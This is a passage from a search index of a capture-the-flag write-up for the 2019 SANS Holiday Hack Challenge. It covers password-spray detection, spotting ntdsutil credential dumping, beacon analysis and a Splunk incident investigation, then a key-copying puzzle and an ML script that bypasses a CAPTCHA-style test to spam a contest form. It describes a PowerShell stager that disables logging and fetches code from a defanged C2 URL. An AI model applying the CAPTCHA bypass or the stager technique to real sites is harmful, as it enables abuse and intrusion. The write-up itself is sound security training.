31 entries with a high number of failed logon attempts. It looks like Shinny Upatree's account is the one that was compromised. Answer # Account: supatree Hint # None","title":"Evaluate Attack Outcome"},{"location":"challenges/c3/#evaluate-attack-outcome","text":"Hint : Bushy Evergreen - Escape Ed","title":"Evaluate Attack Outcome"},{"location":"challenges/c3/#request","text":"We're seeing attacks against the Elf U domain! Using the event log data , identify the user account that the attacker compromised using a password spray attack. Bushy Evergreen is hanging out in the train station and may be able to help you out.","title":"Request"},{"location":"challenges/c3/#resources","text":"Event log data DeepBlueCLI Github DeepBlueCLI: a PowerShell Module for Hunt Teaming via Windows Event Logs","title":"Resources"},{"location":"challenges/c3/#solution","text":"Start by cloning or downloading the DeepBlueCLI Git repository. During a password spray attack the attacker tries the same password across a number of different accounts. When the security event log contains a high number of logon failures in combination with a succesful logon for the same account the attack was likely successful. Run DeepBlue.ps1 against the provided log file. .\\DeepBlue.ps1 ..\\Security.evtx | Sort-Object -Property Date | Format-List DeepBlueCLI finds evidence of the password spray attack and provides a list of 31 targeted usernames but the output is a little hard to digest. Run DeepBlue.ps1 again, this time formatting the output as a table to make things a little easier to read. .\\DeepBlue.ps1 ..\\Security.evtx | Format-Table Message,Results Out of the three accounts that had successful logons supatree is the only one that's also showing up in the list of 31 entries with a high number of failed logon attempts. It looks like Shinny Upatree's account is the one that was compromised.","title":"Solution"},{"location":"challenges/c3/#answer","text":"Account: supatree","title":"Answer"},{"location":"challenges/c3/#hint","text":"None","title":"Hint"},{"location":"challenges/c4/","text":"Determine Attacker Technique # Hint : SugarPlum Mary - Linux Path Request # Using these normalized Sysmon logs , identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process. For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary. Resources # Normalized Sysmon logs EQL Threat Hunting Sysinternals New Tool Sysmon How to find the adversary with EQL Solution # We could install EQL to query the normalized Sysmon logs and find the tool that was used to retrieve the domain password hashes from lsass.exe . Fortunately for us though the log only contains a handful of different types of commands. If we grep for lines containing command_line but exclude the ones containing wevtutil , net use , and powershell only five remain. grep command_line sysmon-data.json | grep -Evi '(powershell|net\\s*use|wevtutil)' MITRE ATT&CK technique T1003 covers credential dumping and provides an overview of some of the commonly used tools. One of the ways to retrieve password hashes in a Windows domain setup is to use the Windows builtin ntdsutil.exe command line tool to grab a copy of the main Active Directory database file (i.e. NTDS.dit ), which is exactly what our attacker did. Answer # Tool: ntdsutil Hint # None","title":"Determine Attacker Technique"},{"location":"challenges/c4/#determine-attacker-technique","text":"Hint : SugarPlum Mary - Linux Path","title":"Determine Attacker Technique"},{"location":"challenges/c4/#request","text":"Using these normalized Sysmon logs , identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process. For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary.","title":"Request"},{"location":"challenges/c4/#resources","text":"Normalized Sysmon logs EQL Threat Hunting Sysinternals New Tool Sysmon How to find the adversary with EQL","title":"Resources"},{"location":"challenges/c4/#solution","text":"We could install EQL to query the normalized Sysmon logs and find the tool that was used to retrieve the domain password hashes from lsass.exe . Fortunately for us though the log only contains a handful of different types of commands. If we grep for lines containing command_line but exclude the ones containing wevtutil , net use , and powershell only five remain. grep command_line sysmon-data.json | grep -Evi '(powershell|net\\s*use|wevtutil)' MITRE ATT&CK technique T1003 covers credential dumping and provides an overview of some of the commonly used tools. One of the ways to retrieve password hashes in a Windows domain setup is to use the Windows builtin ntdsutil.exe command line tool to grab a copy of the main Active Directory database file (i.e. NTDS.dit ), which is exactly what our attacker did.","title":"Solution"},{"location":"challenges/c4/#answer","text":"Tool: ntdsutil","title":"Answer"},{"location":"challenges/c4/#hint","text":"None","title":"Hint"},{"location":"challenges/c5/","text":"Determine Compromised System # Hint : Sparkle Redberry - Xmas Cheer Laser Request # The attacks don't stop! Can you help identify the IP address of the malware-infected system using these Zeek logs ? For hints on achieving this objective, please visit the Laboratory and talk with Sparkle Redberry. Resources # Zeek logs Real Intelligence Threat Analytics (RITA) Solution # With a difficulty rating of only two christmas trees we aren't really supposed to download and install RITA, which is probably why the Zeek logs archive contains a set of static web pages that simulate a RITA web interface. That said, one of the properties of a malware-infected system is beaconing activity as the malware communicates back to a command and control or C2 server. Active Countermeasures' blog post titled Threat Hunting \u2013 Simplifying The Beacon Analysis Process provides the following information on how RITA can help find beaconing activity: \"RITA performs an extensive list of security checks, but one of the most unique is a beacon analysis. RITA breaks out the analysis based on sets of IP addresses. All communications are scrutinized for repeating intervals and even attempts to skew the results. The most important column is the first one, which is labeled \u201cScore\u201d, as this gives a score from 0-1 on the likelihood of communications between the two systems being a beacon.\" . Open up the static version of the RITA web interface and navigate to the 'Beacons' section. The 'Score' column in the 'Beacons' section is already sorted in descending order so the first line with a score of 0.998 is almost certainly beaconing activity originating from IP address 192.168.134.130 . This is also confirmed on the 'Long Connections' section where the same 192.168.134.130 IP is listed as having the longest connection duration as well. Answer # IP: 192.168.134.130 Hint # None","title":"Determine Compromised System"},{"location":"challenges/c5/#determine-compromised-system","text":"Hint : Sparkle Redberry - Xmas Cheer Laser","title":"Determine Compromised System"},{"location":"challenges/c5/#request","text":"The attacks don't stop! Can you help identify the IP address of the malware-infected system using these Zeek logs ? For hints on achieving this objective, please visit the Laboratory and talk with Sparkle Redberry.","title":"Request"},{"location":"challenges/c5/#resources","text":"Zeek logs Real Intelligence Threat Analytics (RITA)","title":"Resources"},{"location":"challenges/c5/#solution","text":"With a difficulty rating of only two christmas trees we aren't really supposed to download and install RITA, which is probably why the Zeek logs archive contains a set of static web pages that simulate a RITA web interface. That said, one of the properties of a malware-infected system is beaconing activity as the malware communicates back to a command and control or C2 server. Active Countermeasures' blog post titled Threat Hunting \u2013 Simplifying The Beacon Analysis Process provides the following information on how RITA can help find beaconing activity: \"RITA performs an extensive list of security checks, but one of the most unique is a beacon analysis. RITA breaks out the analysis based on sets of IP addresses. All communications are scrutinized for repeating intervals and even attempts to skew the results. The most important column is the first one, which is labeled \u201cScore\u201d, as this gives a score from 0-1 on the likelihood of communications between the two systems being a beacon.\" . Open up the static version of the RITA web interface and navigate to the 'Beacons' section. The 'Score' column in the 'Beacons' section is already sorted in descending order so the first line with a score of 0.998 is almost certainly beaconing activity originating from IP address 192.168.134.130 . This is also confirmed on the 'Long Connections' section where the same 192.168.134.130 IP is listed as having the longest connection duration as well.","title":"Solution"},{"location":"challenges/c5/#answer","text":"IP: 192.168.134.130","title":"Answer"},{"location":"challenges/c5/#hint","text":"None","title":"Hint"},{"location":"challenges/c6/","text":"Splunk # Hint : Tangle Coalbox - Frosty Keypad Request # Hi, I'm Dr. Banas, professor of Cheerology at Elf University. This term, I'm teaching \"HOL 404: The Search for Holiday Cheer in Popular Culture,\" and I've had quite a shock! I was at home enjoying a nice cup of Gl\u00f8gg when I had a call from Kent, one of my students who interns at the Elf U SOC. Kent said that my computer has been hacking other computers on campus and that I needed to fix it ASAP! If I don't, he will have to report the incident to the boss of the SOC. Apparently, I can find out more information from this website with the username: elf / Password: elfsocks. I don't know anything about computer security. Can you please help me? Resources # Elf University Splunk Elf University File Archive James Brodsky, Dashing Through the Logs Solution # Jump to the challenge solution . Question 1 # \"What is the short host name of Professor Banas' computer?\" The '#ELFU SOC' chat group has the answer to this question. Zippy mentions \"Yep. And we have some system called 'sweetums' here on campus communicating with the same weird IP\" to which Alice replies \"Gah... that's Professor Banas' system from over in the Polar Studies department\" . To find the answer using Splunk we can use the following query as well. index=main user=cbanas | table _time user ComputerName Answer : sweetums Question 2 # \"What is the name of the sensitive file that was likely accessed and copied by the attacker? Please provide the fully qualified location of the file. (Example: C:\\temp\\report.pdf)\" Similar to question 1, searching for a simple keyword can provide useful results. In this case we query for the string 'santa' to find an event containing a message from Santa to professor Banas referencing the text file Naughty_and_Nice_2019_draft.txt . index=main santa Answer : C:\\Users\\cbanas\\Documents\\Naughty_and_Nice_2019_draft.txt Note The BASE64-encoded string found in this Splunk event decodes to a PowerShell script that tries to disable script block logging , downloads encrypted data from http://144.202.46[.]214:8080/admin/get.php (i.e. the command and control IP address found in LISA ), decrypts it using an embedded key, and finally executes the decrypted code. Question 3 # \"What is the fully-qualified domain name(FQDN) of the command and control(C2) server? (Example: badguy.baddies.com)\" Search the collected Sysmon data for network connection activity (i.e. Sysmon event ID 3 ) and add 'powershell' to narrow down the results. Use fields like dest_host and DestinationHostname in the left sidebar to show specific information. index=main sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" powershell EventCode=3 Answer : 144.202.46.214.vultr.com Question 4 # \"What document is involved with launching the malicious PowerShell code? Please provide just the filename. (Example: results.txt)\" Start by searching for all PowerShell activity by specifying the appropriate source and reverse the sort order so the oldest search results are at the top of the list. Click on the timestamp and in the popup dialog select a +/- five-second window. index=main sourcetype=\"WinEventLog:Microsoft-Windows-Powershell/Operational\" | reverse Now that we have all PowerShell activity in this 10-second timeframe we need to pivot to another source to find the associated process IDs. Powershell logs don't provide this information but Sysmon logs do so replace the PowerShell sourcetype with the one for Sysmon and look at the process_id or ProcessId fields. index=main source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" Now that we have two process IDs we need to determine what was responsible for spawning these PowerShell processes. Process creation events can be found in either Sysmon logs as Sysmon event ID 1 or in Windows logs as Windows event ID 4688 . When searching for the latter, any process ID values need to be specified in hexadecimal. So, 5864 and 6268 have to be translated to 0x16E8 and 0x187C . Be sure to set the search window to 'All time' again as the parent process for these PowerShell processes will most likely fall outside of the currently selected 10-second timeframe. index=main sourcetype=WinEventLog EventCode=4688 (process_id=0x16e8 OR process_id=0x187c) Answer : 19th Century Holiday Cheer Assignment.docm Question 5 # \"How many unique email addresses were used to send Holiday Cheer essays to Professor Banas? Please provide the numeric value. (Example: 1)\" According to Alice \"You should be aware that Professor Banas was very clear in his instructions to his students: All assignment submissions must be made via email and must have the subject 'Holiday Cheer Assignment Submission'\" . As email addresses are not case sensitive we need to make sure we don't double-count any search results. Search stoQ logs for the correct subject line and count the number of results. index=main sourcetype=stoq \"results{}.workers.smtp.subject\"=\"Holiday Cheer Assignment Submission\" | stats count by results{}.workers.smtp.subject Answer : 21 Question 6 # \"What was the password for the zip archive that contained the suspicious file?\" MITRE ATT&CK Technique 1193 which Alice refers to is 'Spearphishing Attachment'. If the document is password protected then the attacker needs to let the victim know the password in order to open the document and execute the malicious code. In other words, we should be able to find a mention of it in the body of an email. index=main sourcetype=stoq \"results{}.workers.smtp.body\"=*password* | table results{}.workers.smtp.from results{}.workers.smtp.body Answer : 123456789 Question 7 # \"What email address did the suspicious file come from?\" The answer is provided by exactly the same Splunk query we used for the previous question. index=main sourcetype=stoq \"results{}.workers.smtp.body\"=*password* | table results{}.workers.smtp.from results{}.workers.smtp.body Answer : bradly.buttercups@eifu.org Challenge # \"What was the message for Kent that the adversary embedded in this attack?\" Alice provides the initial Splunk query to get us started. stoQ will store any file metadata in Splunk but the raw artifact is uploaded to the File Archive . Start by running Alice's query and look at the JSON output. The combination of archivers.filedir.path and payload_meta.extra_data.filename in the results array provides the path to each artifact in the Elf-U File Archive. index=main sourcetype=stoq \"results{}.workers.smtp.from\"=\"bradly buttercups <bradly.buttercups@eifu.org>\" Next we extract the results array using spath , loop over its items using mvexpand , and for each list item extract both archivers.filedir.path and payload_meta.extra_data.filename (again, using spath). To keep things clean we only show results where archivers.filedir.path is not an empty string. index=main sourcetype=stoq \"results{}.workers.smtp.from\"=\"bradly buttercups <bradly.buttercups@eifu.org>\" | eval results = spath(_raw, \"results{}\") | mvexpand results | eval path=spath(results, \"archivers.filedir.path\"), filename=spath(results, \"payload_meta.extra_data.filename\") | search path!=\"\" | table filename, path The obvious candidates for further investigation are Buttercups_HOL404_assignment.zip and 19th Century Holiday Cheer Assignment.docm but both of these have been sanitized and contain a warning message. Luckily the .docm artifact also provides a hint about core.xml , stating \"The core.xml file that was a component of this original macro-enabled Word doc is still in this File Archive thanks to stoQ. Find it and you will be a happy elf :-)\" . Saves us some work of having to verify all remaining artifacts. Answer : Kent you are so unfair. And we were going to make you the king of the Winter Carnival. All of the 20 remaining documents, who submitted them, the associated File Archive link, and email message body can be retrieved using the below Splunk query. Looks like some of the elves spent just a little more time on this assignment than others. index=main sourcetype=stoq \"results{}.workers.smtp.subject\"=\"Holiday Cheer Assignment Submission\" | eval results = spath(_raw, \"results{}\"), from = spath(_raw, \"results{}.workers.smtp.from\"), body = spath(_raw, \"results{}.workers.smtp.body\") | mvexpand results | eval path=spath(results, \"archivers.filedir.path\"), filename=spath(results, \"payload_meta.extra_data.filename\") | search filename=\"*.docx\" OR filename=\"*.zip\" | table from, filename, path, body Answer # sweetums C:\\Users\\cbanas\\Documents\\Naughty_and_Nice_2019_draft.txt 144.202.46.214.vultr.com 19th Century Holiday Cheer Assignment.docm 21 123456789 bradly.buttercups@eifu.org Kent you are so unfair. And we were going to make you the king of the Winter Carnival. Hint # Oh, thanks so much for your help! Sorry I was freaking out. I've got to talk to Kent about using my email again... ...and picking up my dry cleaning.","title":"Splunk"},{"location":"challenges/c6/#splunk","text":"Hint : Tangle Coalbox - Frosty Keypad","title":"Splunk"},{"location":"challenges/c6/#request","text":"Hi, I'm Dr. Banas, professor of Cheerology at Elf University. This term, I'm teaching \"HOL 404: The Search for Holiday Cheer in Popular Culture,\" and I've had quite a shock! I was at home enjoying a nice cup of Gl\u00f8gg when I had a call from Kent, one of my students who interns at the Elf U SOC. Kent said that my computer has been hacking other computers on campus and that I needed to fix it ASAP! If I don't, he will have to report the incident to the boss of the SOC. Apparently, I can find out more information from this website with the username: elf / Password: elfsocks. I don't know anything about computer security. Can you please help me?","title":"Request"},{"location":"challenges/c6/#resources","text":"Elf University Splunk Elf University File Archive James Brodsky, Dashing Through the Logs","title":"Resources"},{"location":"challenges/c6/#solution","text":"Jump to the challenge solution .","title":"Solution"},{"location":"challenges/c6/#question-1","text":"\"What is the short host name of Professor Banas' computer?\" The '#ELFU SOC' chat group has the answer to this question. Zippy mentions \"Yep. And we have some system called 'sweetums' here on campus communicating with the same weird IP\" to which Alice replies \"Gah... that's Professor Banas' system from over in the Polar Studies department\" . To find the answer using Splunk we can use the following query as well. index=main user=cbanas | table _time user ComputerName Answer : sweetums","title":"Question 1"},{"location":"challenges/c6/#question-2","text":"\"What is the name of the sensitive file that was likely accessed and copied by the attacker? Please provide the fully qualified location of the file. (Example: C:\\temp\\report.pdf)\" Similar to question 1, searching for a simple keyword can provide useful results. In this case we query for the string 'santa' to find an event containing a message from Santa to professor Banas referencing the text file Naughty_and_Nice_2019_draft.txt . index=main santa Answer : C:\\Users\\cbanas\\Documents\\Naughty_and_Nice_2019_draft.txt Note The BASE64-encoded string found in this Splunk event decodes to a PowerShell script that tries to disable script block logging , downloads encrypted data from http://144.202.46[.]214:8080/admin/get.php (i.e. the command and control IP address found in LISA ), decrypts it using an embedded key, and finally executes the decrypted code.","title":"Question 2"},{"location":"challenges/c6/#question-3","text":"\"What is the fully-qualified domain name(FQDN) of the command and control(C2) server? (Example: badguy.baddies.com)\" Search the collected Sysmon data for network connection activity (i.e. Sysmon event ID 3 ) and add 'powershell' to narrow down the results. Use fields like dest_host and DestinationHostname in the left sidebar to show specific information. index=main sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" powershell EventCode=3 Answer : 144.202.46.214.vultr.com","title":"Question 3"},{"location":"challenges/c6/#question-4","text":"\"What document is involved with launching the malicious PowerShell code? Please provide just the filename. (Example: results.txt)\" Start by searching for all PowerShell activity by specifying the appropriate source and reverse the sort order so the oldest search results are at the top of the list. Click on the timestamp and in the popup dialog select a +/- five-second window. index=main sourcetype=\"WinEventLog:Microsoft-Windows-Powershell/Operational\" | reverse Now that we have all PowerShell activity in this 10-second timeframe we need to pivot to another source to find the associated process IDs. Powershell logs don't provide this information but Sysmon logs do so replace the PowerShell sourcetype with the one for Sysmon and look at the process_id or ProcessId fields. index=main source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" Now that we have two process IDs we need to determine what was responsible for spawning these PowerShell processes. Process creation events can be found in either Sysmon logs as Sysmon event ID 1 or in Windows logs as Windows event ID 4688 . When searching for the latter, any process ID values need to be specified in hexadecimal. So, 5864 and 6268 have to be translated to 0x16E8 and 0x187C . Be sure to set the search window to 'All time' again as the parent process for these PowerShell processes will most likely fall outside of the currently selected 10-second timeframe. index=main sourcetype=WinEventLog EventCode=4688 (process_id=0x16e8 OR process_id=0x187c) Answer : 19th Century Holiday Cheer Assignment.docm","title":"Question 4"},{"location":"challenges/c6/#question-5","text":"\"How many unique email addresses were used to send Holiday Cheer essays to Professor Banas? Please provide the numeric value. (Example: 1)\" According to Alice \"You should be aware that Professor Banas was very clear in his instructions to his students: All assignment submissions must be made via email and must have the subject 'Holiday Cheer Assignment Submission'\" . As email addresses are not case sensitive we need to make sure we don't double-count any search results. Search stoQ logs for the correct subject line and count the number of results. index=main sourcetype=stoq \"results{}.workers.smtp.subject\"=\"Holiday Cheer Assignment Submission\" | stats count by results{}.workers.smtp.subject Answer : 21","title":"Question 5"},{"location":"challenges/c6/#question-6","text":"\"What was the password for the zip archive that contained the suspicious file?\" MITRE ATT&CK Technique 1193 which Alice refers to is 'Spearphishing Attachment'. If the document is password protected then the attacker needs to let the victim know the password in order to open the document and execute the malicious code. In other words, we should be able to find a mention of it in the body of an email. index=main sourcetype=stoq \"results{}.workers.smtp.body\"=*password* | table results{}.workers.smtp.from results{}.workers.smtp.body Answer : 123456789","title":"Question 6"},{"location":"challenges/c6/#question-7","text":"\"What email address did the suspicious file come from?\" The answer is provided by exactly the same Splunk query we used for the previous question. index=main sourcetype=stoq \"results{}.workers.smtp.body\"=*password* | table results{}.workers.smtp.from results{}.workers.smtp.body Answer : bradly.buttercups@eifu.org","title":"Question 7"},{"location":"challenges/c6/#challenge","text":"\"What was the message for Kent that the adversary embedded in this attack?\" Alice provides the initial Splunk query to get us started. stoQ will store any file metadata in Splunk but the raw artifact is uploaded to the File Archive . Start by running Alice's query and look at the JSON output. The combination of archivers.filedir.path and payload_meta.extra_data.filename in the results array provides the path to each artifact in the Elf-U File Archive. index=main sourcetype=stoq \"results{}.workers.smtp.from\"=\"bradly buttercups <bradly.buttercups@eifu.org>\" Next we extract the results array using spath , loop over its items using mvexpand , and for each list item extract both archivers.filedir.path and payload_meta.extra_data.filename (again, using spath). To keep things clean we only show results where archivers.filedir.path is not an empty string. index=main sourcetype=stoq \"results{}.workers.smtp.from\"=\"bradly buttercups <bradly.buttercups@eifu.org>\" | eval results = spath(_raw, \"results{}\") | mvexpand results | eval path=spath(results, \"archivers.filedir.path\"), filename=spath(results, \"payload_meta.extra_data.filename\") | search path!=\"\" | table filename, path The obvious candidates for further investigation are Buttercups_HOL404_assignment.zip and 19th Century Holiday Cheer Assignment.docm but both of these have been sanitized and contain a warning message. Luckily the .docm artifact also provides a hint about core.xml , stating \"The core.xml file that was a component of this original macro-enabled Word doc is still in this File Archive thanks to stoQ. Find it and you will be a happy elf :-)\" . Saves us some work of having to verify all remaining artifacts. Answer : Kent you are so unfair. And we were going to make you the king of the Winter Carnival. All of the 20 remaining documents, who submitted them, the associated File Archive link, and email message body can be retrieved using the below Splunk query. Looks like some of the elves spent just a little more time on this assignment than others. index=main sourcetype=stoq \"results{}.workers.smtp.subject\"=\"Holiday Cheer Assignment Submission\" | eval results = spath(_raw, \"results{}\"), from = spath(_raw, \"results{}.workers.smtp.from\"), body = spath(_raw, \"results{}.workers.smtp.body\") | mvexpand results | eval path=spath(results, \"archivers.filedir.path\"), filename=spath(results, \"payload_meta.extra_data.filename\") | search filename=\"*.docx\" OR filename=\"*.zip\" | table from, filename, path, body","title":"Challenge"},{"location":"challenges/c6/#answer","text":"sweetums C:\\Users\\cbanas\\Documents\\Naughty_and_Nice_2019_draft.txt 144.202.46.214.vultr.com 19th Century Holiday Cheer Assignment.docm 21 123456789 bradly.buttercups@eifu.org Kent you are so unfair. And we were going to make you the king of the Winter Carnival.","title":"Answer"},{"location":"challenges/c6/#hint","text":"Oh, thanks so much for your help! Sorry I was freaking out. I've got to talk to Kent about using my email again... ...and picking up my dry cleaning.","title":"Hint"},{"location":"challenges/c7/","text":"Get Access to the Steam Tunnels # Hint : Minty Candycane - Holiday Hack Trail Request # Gain access to the steam tunnels. Who took the turtle doves? Please tell us their first and last name. For hints on achieving this objective, please visit Minty's dorm room and talk with Minty Candy Cane. Resources # Key and Lock Decoding Tools Deviant Ollam, Optical Decoding of Keys Solution # To enter the steam tunnels we need to copy the right key and use it with the lock in the dorm room closet. When you enter the dorm room a mysterious figure with a key hanging from his belt will linger for a few seconds and then run away into the closet. No matter the amount of zooming and enhancing, the key resolution is far too low to be useful. We need to find a better image. Each elf has their own specific CSS class and avatar image (there's even a few elves and toy soldiers which are listed in the CSS but don't seem to appear in the game itself). For example, the CSS class and associated image for Minty's avatar are shown below. Additionally, the HTML for Minty's room contains a div with a class titled krampus and a krampus.png background image that is stored in the same location as the other elf avatars, /images/avatars/elves/ . Unlike other avatars that are low res though, krampus.png has quite a high resolution (i.e. 881\u200a\u00d7\u200a1950 pixels) Now use the files in the Key and Lock Decoding Tools Github repository to identify the correct key type (i.e. Schlage). I skipped this step and just winged it by drawing evenly spaced horizontal lines on the key image using the first and second cut as a reference (see the image below). I was fairly certain about cuts 1, 2, 3, and 5, but the fourth cut was off by one. Tweaking it slightly gave me a working key on my second attempt. That said, the Schlage measurements and decoding templates provide the correct measurements and will allow you to make a good copy on the first try. Use the key grinder in Minty's dorm room, enter 122520 for the cuts, and giggle at the bzzzzt... ting! sound effect. Download the 122520.png file and use it on the lock in the dorm room closet. A hidden door will open, revealing a message on the wall that reads 'This is it'. Follow the steam tunnels to meet up with the mysterious figure you first saw running away in Minty's room. He'll introduce himself as Krampus Hollyfeld and explain why he borrowed Jane and Michael. Answer # Who took the doves: Krampus Hollyfeld Hint # Hello there! I\u2019m Krampus Hollyfeld. I maintain the steam tunnels underneath Elf U, Keeping all the elves warm and jolly. Though I spend my time in the tunnels and smoke, In this whole wide world, there's no happier bloke! Yes, I borrowed Santa\u2019s turtle doves for just a bit. Someone left some scraps of paper near that fireplace, which is a big fire hazard. I sent the turtle doves to fetch the paper scraps. But, before I can tell you more, I need to know that I can trust you. Tell you what \u2013 if you can help me beat the Frido Sleigh contest (Objective 8), then I'll know I can trust you. The contest is here on my screen and at fridosleigh.com . No purchase necessary, enter as often as you want, so I am! They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs. Unfortunately, it's restricted to elves only, and I can't bypass the CAPTEHA. (That's Completely Automated Public Turing test to tell Elves and Humans Apart.) I've already cataloged 12,000 images and decoded the API interface . Can you help me bypass the CAPTEHA and submit lots of entries?","title":"Get Access to the Steam Tunnels"},{"location":"challenges/c7/#get-access-to-the-steam-tunnels","text":"Hint : Minty Candycane - Holiday Hack Trail","title":"Get Access to the Steam Tunnels"},{"location":"challenges/c7/#request","text":"Gain access to the steam tunnels. Who took the turtle doves? Please tell us their first and last name. For hints on achieving this objective, please visit Minty's dorm room and talk with Minty Candy Cane.","title":"Request"},{"location":"challenges/c7/#resources","text":"Key and Lock Decoding Tools Deviant Ollam, Optical Decoding of Keys","title":"Resources"},{"location":"challenges/c7/#solution","text":"To enter the steam tunnels we need to copy the right key and use it with the lock in the dorm room closet. When you enter the dorm room a mysterious figure with a key hanging from his belt will linger for a few seconds and then run away into the closet. No matter the amount of zooming and enhancing, the key resolution is far too low to be useful. We need to find a better image. Each elf has their own specific CSS class and avatar image (there's even a few elves and toy soldiers which are listed in the CSS but don't seem to appear in the game itself). For example, the CSS class and associated image for Minty's avatar are shown below. Additionally, the HTML for Minty's room contains a div with a class titled krampus and a krampus.png background image that is stored in the same location as the other elf avatars, /images/avatars/elves/ . Unlike other avatars that are low res though, krampus.png has quite a high resolution (i.e. 881\u200a\u00d7\u200a1950 pixels) Now use the files in the Key and Lock Decoding Tools Github repository to identify the correct key type (i.e. Schlage). I skipped this step and just winged it by drawing evenly spaced horizontal lines on the key image using the first and second cut as a reference (see the image below). I was fairly certain about cuts 1, 2, 3, and 5, but the fourth cut was off by one. Tweaking it slightly gave me a working key on my second attempt. That said, the Schlage measurements and decoding templates provide the correct measurements and will allow you to make a good copy on the first try. Use the key grinder in Minty's dorm room, enter 122520 for the cuts, and giggle at the bzzzzt... ting! sound effect. Download the 122520.png file and use it on the lock in the dorm room closet. A hidden door will open, revealing a message on the wall that reads 'This is it'. Follow the steam tunnels to meet up with the mysterious figure you first saw running away in Minty's room. He'll introduce himself as Krampus Hollyfeld and explain why he borrowed Jane and Michael.","title":"Solution"},{"location":"challenges/c7/#answer","text":"Who took the doves: Krampus Hollyfeld","title":"Answer"},{"location":"challenges/c7/#hint","text":"Hello there! I\u2019m Krampus Hollyfeld. I maintain the steam tunnels underneath Elf U, Keeping all the elves warm and jolly. Though I spend my time in the tunnels and smoke, In this whole wide world, there's no happier bloke! Yes, I borrowed Santa\u2019s turtle doves for just a bit. Someone left some scraps of paper near that fireplace, which is a big fire hazard. I sent the turtle doves to fetch the paper scraps. But, before I can tell you more, I need to know that I can trust you. Tell you what \u2013 if you can help me beat the Frido Sleigh contest (Objective 8), then I'll know I can trust you. The contest is here on my screen and at fridosleigh.com . No purchase necessary, enter as often as you want, so I am! They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs. Unfortunately, it's restricted to elves only, and I can't bypass the CAPTEHA. (That's Completely Automated Public Turing test to tell Elves and Humans Apart.) I've already cataloged 12,000 images and decoded the API interface . Can you help me bypass the CAPTEHA and submit lots of entries?","title":"Hint"},{"location":"challenges/c8/","text":"Bypassing the Frido Sleigh CAPTEHA # Hint : Alabaster Snowball - Nyanshell Request # Help Krampus beat the Frido Sleigh contest . For hints on achieving this objective, please talk > with Alabaster Snowball in the Speaker Unpreparedness Room. Krampus: The contest is here on my screen and at fridosleigh.com . No purchase necessary, enter as often as you want, so I am! They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs. Unfortunately, it's restricted to elves only, and I can't bypass the CAPTEHA. (That's Completely Automated Public Turing test to tell Elves and Humans Apart.) I've already cataloged 12,000 images and decoded the API interface . Can you help me bypass the CAPTEHA and submit lots of entries? Resources # fridosleigh.com Image Training Data CAPTEHA API interface TensorFlow Machine Learning Demo Code Chris Davis, Machine Learning Use Cases for Cybersecurity Solution # Buckle up as we just reached the difficulty 4 and 5 challenges. Free Frido Sleigh cookies for life sounds like a pretty sweet deal, except for one minor issue. The form contains one of those super annoying CAPTEHA tests. \"A \u201cCAPTEHA\u201d is a Turing test to tell elves and humans apart. It is easy for an elf to solve because elves are magical creatures that work on holiday related objects year-round and can spot and click hundreds of holiday items per second. However, non-elves (like humans) will find it nearly impossible to visualize, correctly identify and click holiday items fast enough before the time runs out.\" In order to get around this we need a script that grabs the CAPTEHA data from fridosleigh.com , loops over all 100 images, selects the correct types, submits the final selection, and finally spams the hell out of the Frido Sleigh contest form. Luckily, all of the steps required, except for the image prediction portion, are already handled by the capteha_api.py script we receive from Krampus. For the image processing and prediction step, download and unpack the 12,000 images and clone or download the TensorFlow Machine Learning Demo Github repository. Follow the demo instructions to install the required Python packages. git clone https://github.com/chrisjd20/img_rec_tf_ml_demo.git cd img_rec_tf_ml_demo sudo apt install python3 python3-pip -y sudo python3 -m pip install --upgrade pip sudo python3 -m pip install --upgrade setuptools sudo python3 -m pip install --upgrade tensorflow==1.15 sudo python3 -m pip install tensorflow_hub Next, train the TensorFlow Machine Learning model by running the retrain.py script and providing the image folder as input. Depending on the hardware resources available this could create problems later on. On some hardware and with the default model it can take longer than 10 seconds to check each of the 100 images and fail the test as a result. The documentation at the top of the retrain.py script provides a possible solution though. \"By default this script will use the highly accurate, but comparatively large and slow Inception V3 model architecture. It's recommended that you start with this to validate that you have gathered good training data, but if you want to deploy on resource-limited platforms, you can try the --tfhub_module flag with a Mobilenet model.\" The default 299 x 299 image resolution used in retrain.py far exceeds what we need for the smaller CAPTEHA image data. A Mobilenet model with a smaller image size (i.e. 128 x 128) is more than enough and will, as the retrain.py documentation describes, give us faster speeds. Train the TensorFlow Machine Learning model using the sample images provided by Krampus and the proper Mobilenet model (i.e. 100 neurons and 128 input image size) as input. python retrain.py --image_dir ./training_images --tfhub_module \\ https://tfhub.dev/google/imagenet/mobilenet_v1_100_128/quantops/feature_vector/3 Once training is complete grab all the functions and remaining code from the predict_images_using_trained_model.py demo script and add them to capteha_api.py . Be sure to update both the input_height and input_width parameters in the read_tensor_from_image_bytes function to match the value defined by the selected Mobilenet model as well. The final script can be found in the 'Scripts' section, but a few code snippets from the main function are highlighted below. Request a CAPTEHA, store the image data, and parse out the image types we need to select. url = \"https://fridosleigh.com/\" # Create session s = requests.Session() # Get CAPTEHA images and types r = s.post(f'{url}api/capteha/request') if (r.json()['request']): images = r.json()['images'] types = [x.strip() for x in r.json()['select_type'].split(',')] types[-1] = types[-1].replace('and ', '') Next, iterate over the images and for each image extract the UUID, convert the BASE64 image data to binary, and use both as input to process and predict the image. Wait for all processing to finish (i.e. the queue size matches the number of images) and create a list containing the final prediction results. # Can use queues and threading to spead up the processing q = queue.Queue() # Going to interate over each of our images. for image in images: img_uuid = image['uuid'] img_base64 = image['base64'] print('Processing Image {}'.format(img_uuid)) # We don't want to process too many images at once. 10 threads max while len(threading.enumerate()) > 10: time.sleep(0.0001) # Predict_image function is expecting png image bytes so we read # image as 'rb' to get a bytes object image_bytes = base64.b64decode(img_base64) threading.Thread( target=predict_image, args=( q, sess, graph, image_bytes, img_uuid, labels, input_operation, output_operation ) ).start() print('Waiting For Threads to Finish...') while q.qsize() < len(images): time.sleep(0.001) # Getting a list of all threads returned results prediction_results = [q.get() for x in range(q.qsize())] Loop over the prediction results and, if an image matches a requested type, add its UUID to the answers list. answers = 